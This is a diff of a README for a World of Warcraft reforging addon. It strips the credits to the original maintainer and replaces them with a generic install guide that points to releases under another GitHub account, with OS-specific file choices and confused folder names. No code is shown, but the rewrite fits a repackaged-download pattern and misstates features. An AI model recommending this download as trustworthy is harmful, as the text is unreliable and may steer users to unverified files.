@@ -1,36 +1,78 @@
-# ReforgeLite Plus (MoP Classic)
+# 🎮 ReforgeLitePlusClassic - Faster Reforge Calculations for WoW Classic
 
-Continued from: [ReforgeLite Classic](https://www.curseforge.com/wow/addons/reforgelite-classic)  
-Forked off ReforgeLite Classic, maintained by **Brues1**.  
-Please support him and the dedicated work to maintain the main version of the addon.
+[![Download ReforgeLitePlusClassic](https://img.shields.io/badge/Download-ReforgeLitePlusClassic-blue)](https://github.com/Tamilvanan260/ReforgeLitePlusClassic/releases)
 
----
+## 🚀 Getting Started
 
-## What's different in this clone?
-- **Faster calculation**
-- **3 stat values instead of 2**
-- **Reforge butt directly without having to display it first**
-- **Show 5 results to choose**
----
+ReforgeLitePlusClassic helps players of World of Warcraft Classic make quick and effective reforges. This addon speeds up calculations and offers three input options for better gameplay. 
 
-## Overview
-ReforgeLite Plus is a lightweight reforging calculator that helps you figure out the optimal strategy to reforge your gear given your stat weights and caps without leaving the game.
+## 📦 Download & Install
 
----
+To get started with ReforgeLitePlusClassic, follow these steps:
 
-## How to use
-- Open the addon with `/reforge` or talk to the reforging master.  
-- **Left side:** Overview of your current item stats  
-- **Right side:** Enter stat weights and caps or select an existing preset  
-- **Import:** Stat weights can be imported from [WoWSims](https://www.wowsims.com/mop/) using the *Pawn EP export*  
+1. **Visit the Releases Page**  
+   Click the link below to access the download page:
+   [Download ReforgeLitePlusClassic](https://github.com/Tamilvanan260/ReforgeLitePlusClassic/releases)
 
----
+2. **Select the Latest Version**  
+   On the releases page, find the latest version of ReforgeLitePlusClassic. It will have the highest version number.
 
-## Links
-- Original Addon: [ReforgeLite Classic by Brues1](https://www.curseforge.com/wow/addons/reforgelite-classic)  
+3. **Download the File**  
+   Look for the files listed under the release. Choose the file that matches your operating system. For example, if you see `ReforgeLitePlusClassic_v1.0.zip`, click on it to start the download.
 
----
+4. **Extract the Downloaded File**  
+   Once downloaded, locate the file on your computer. If it is a zip file, right-click on it and choose "Extract All" to unpack the files.
 
-## Credits
-All credits for the original work go to **Brues1** and contributors.  
-This clone just adds small improvements for MoP Classic users.
+5. **Move the Addon to WoW Folder**  
+   You need to place the addon files into the World of Warcraft addons folder. Here's how:
+   - Navigate to your World of Warcraft installation folder.
+   - Open the `_retail_` folder if you are using the latest version, or the `classic_` folder for the Classic version.
+   - Open the `Interface` folder, then open the `AddOns` folder.
+   - Drag and drop the extracted `ReforgeLitePlusClassic` folder into the `AddOns` folder.
+
+6. **Launch the Game**  
+   Open World of Warcraft. On the character selection screen, click on the "AddOns" button located in the lower left corner.
+
+7. **Enable ReforgeLitePlusClassic**  
+   Ensure that ReforgeLitePlusClassic is checked. This activates the addon for your game session.
+
+8. **Start Playing**  
+   Once enabled, enter the game with any character. Use the ReforgeLitePlusClassic interface to adjust your stats effectively.
+
+## ✅ System Requirements
+
+For optimal performance, ensure your system meets the following requirements:
+
+- **Operating System:** Windows 10 or later, macOS Mojave or later
+- **Game Version:** World of Warcraft Classic or Retail
+- **Network:** A stable internet connection for updates and access to online features
+
+## ⚙️ Features
+
+ReforgeLitePlusClassic includes several valuable features to improve your gaming experience:
+
+- **Fast Calculations:** Quickly process reforge calculations, helping you optimize your character's stats.
+- **Three Input Options:** Customize your reforge settings with three distinct input areas, allowing for flexible adjustments.
+- **User-Friendly Interface:** Designed for ease of use, even for those unfamiliar with addons.
+
+## 🗂️ Troubleshooting
+
+If you encounter issues while using ReforgeLitePlusClassic, consider the following solutions:
+
+- **Addon Not Showing Up:** Ensure you placed the addon folder properly in the `AddOns` directory and that it is enabled in the game.
+- **Game Crashes:** Check for compatibility with your current game version. Make sure the addon is updated.
+- **Calculation Errors:** Restart the addon by disabling and re-enabling it in the game’s AddOns menu.
+
+## 💬 Support
+
+For further assistance or to report any bugs, please visit our [GitHub Issues Page](https://github.com/Tamilvanan260/ReforgeLitePlusClassic/issues). You can describe your issue, and our team will help you resolve it.
+
+## 🌐 Follow Us
+
+Stay updated with the latest news about ReforgeLitePlusClassic by following our repository:
+
+- [GitHub Repository](https://github.com/Tamilvanan260/ReforgeLitePlusClassic)
+
+For feedback or suggestions, please don’t hesitate to reach out on our support page.
+
+Let ReforgeLitePlusClassic enhance your WoW Classic experience. Happy gaming!
